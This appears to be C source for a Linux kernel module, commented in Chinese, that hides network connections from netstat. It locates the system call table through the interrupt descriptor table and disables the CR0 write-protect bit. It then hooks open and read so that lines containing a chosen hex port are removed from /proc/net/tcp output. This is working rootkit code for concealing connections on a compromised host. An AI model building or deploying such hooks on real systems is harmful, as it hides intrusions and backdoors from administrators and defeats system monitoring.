/*

    为了隐藏netstat所写出的文件

    author:Edward

    date:2/28

    未完成内容：提供一个端口号，转换成16进制数，然后作为关键词删除

*/



#include <linux/module.h>

#include <linux/kernel.h>

#include <asm/unistd.h>

#include <stddef.h>
#include <linux/fs.h>           /*struct file*/

#include <linux/file.h>         /*fget() fput()*/

#include <linux/dcache.h>       /*d_path()*/

#include <linux/string.h>

#define CALLOFF 100

MODULE_LICENSE("GPL"); //设置模块的许可证

/*

    这个sys_call_table,我是通过在/boot/System.map带头的文件，用root权限，以vim查看，用/sys_call_table来查找，得到的系统调用表地址
    */

/*

    由于系统调用表所在的内存区域通常为只读的，不可写，我们要修改这片区域的权限，需要在cr0寄存器的特定位17位设置0，使该内存区域具有写权限，因此我们要把原cr0寄存器的值取出，再将寄存器与上0xfffeffff，使得第17位置0

*/


    struct {

    unsigned short limit;

    unsigned int base;

} __attribute__ ((packed)) idtr;



struct {

    unsigned short off1;

    unsigned short sel;

    unsigned char none,flags;

    unsigned short off2;

} __attribute__ ((packed)) * idt;





  
 char * pc_FdName = NULL;

  const  char * tagetString="/proc/net/tcp";
 int tcpflag=0;
 int find=0;



void ** sys_call_table;

asmlinkage ssize_t (*origin_read)(int fd, const void *buf, size_t count);

asmlinkage int (*origin_open)(const char *pathname, int flags);

unsigned int clear_cr0(void)

{

    unsigned int cr0=0;

    unsigned int ret;

asm volatile ("movl %%cr0,%%eax":"=a"(cr0));

    ret=cr0;//取出原有值

    cr0 &=0xfffeffff;//第17位置0

    asm volatile ("movl %%eax,%%cr0"::"a"(cr0));//将修改过的cr0存回原寄存器

    return ret;

}

void setback_cr0(unsigned int val)

{

    asm volatile ("movl %%eax,%%cr0"::"a"(val));//将cr0寄存器的值设为val

}

int searchKeyword(void *buf,size_t count){

    char *p;
    for(p=buf;p<(char*)(buf+count);p++){		               
                if(*p=='1'&&*(p+1)=='F'&&*(p+2)=='5'&&*(p+3)=='7')
                {
                	return 1;
                }
            }
    return 0;
}
ssize_t rmKeyWord(void *buf,size_t count){

    char* startLine;
    char* endLine;
	char* mybuf;

    char* p;
    int length;
		
	mybuf=startLine=endLine=buf;


    for(p=buf;p<(char *)(buf+count);p++){
        if( *p=='\x0a' || *p=='\x0d'){ // if here is the '\n' or '\r'
           endLine=p;

            length=endLine-startLine;
            if(searchKeyword(startLine,length)){
				memmove(startLine,endLine+1,count-(int)(endLine+1-mybuf));
                count=count-length-1;
                p-=length;
                }
            //startLine=p+sizeof(char);
						startLine=p;
        }

    } 
    return count;
}



asmlinkage int hooked_open(const char *pathname, int flags){
		int res;
		
		if(!strcmp(pathname,tagetString))
		{
			tcpflag=1;
		}
		else 
			tcpflag=0;
		
		res=(*origin_open)(pathname,flags);
		
		return res;
		
}



asmlinkage ssize_t hooked_read(int fd, void *buf, size_t count){

    ssize_t res;
    res=(*origin_read)(fd,buf,count);


		if(tcpflag){
			res=rmKeyWord(buf,res);
		}

		return res;
}





char * findoffset(char *start)
{

    char *p;

    for (p = start; p < start + CALLOFF; p++)

    if (*(p + 0) == '\xff' && *(p + 1) == '\x14' && *(p + 2) == '\x85')

        return p;

    return NULL;
}

void **get_sct_addr(void)
{
    unsigned sys_call_off;

    unsigned sct = 0;

    char *p;

    asm("sidt %0":"=m"(idtr));

    idt = (void *) (idtr.base + 8 * 0x80);

    sys_call_off = (idt->off2 << 16) | idt->off1;

    if ((p = findoffset((char *) sys_call_off)))

        sct = *(unsigned *) (p + 3);

    return ((void **)sct);
}

/*

模块的初始化函数 当载入模块时调用

先将原系统调用表的函数取出，并打印，再修改cr0，使其第17位置0，使得系统调用表区域可写，再将我们构造的系统调用函数写入，最后将cr0恢复,再打印

*/

static int begin(void)

{

    unsigned int cr0;

    sys_call_table=get_sct_addr();

    origin_open=sys_call_table[__NR_open];
    origin_read=sys_call_table[__NR_read];

    printk("<0> sys_call_table[__NR_read] = 0x%x\n", (unsigned int)sys_call_table[__NR_read]);
	printk("<0> sys_call_table[__NR_open] = 0x%x\n", (unsigned int)sys_call_table[__NR_open]);


    cr0=clear_cr0();

    sys_call_table[__NR_open]=hooked_open;
    sys_call_table[__NR_read]=hooked_read;

    setback_cr0(cr0);

    printk("<1> sys_call_table[__NR_read] = 0x%x\n", (unsigned int)sys_call_table[__NR_read]);
	printk("<1> sys_call_table[__NR_open] = 0x%x\n", (unsigned int)sys_call_table[__NR_open]);

    return 0;

}

/*

模块的卸载函数 当模块卸载时调用

先将系统调用表区域权限设置为可写，然后修改系统调用表的表项，最后恢复系统调用表权限为只读。

*/

static void end(void)

{

    unsigned int cr0;

    cr0=clear_cr0();

    if(sys_call_table)

    {

        sys_call_table[__NR_open]=origin_open;
		sys_call_table[__NR_read]=origin_read;

    }

    setback_cr0(cr0);

}





module_init(begin);

module_exit(end);






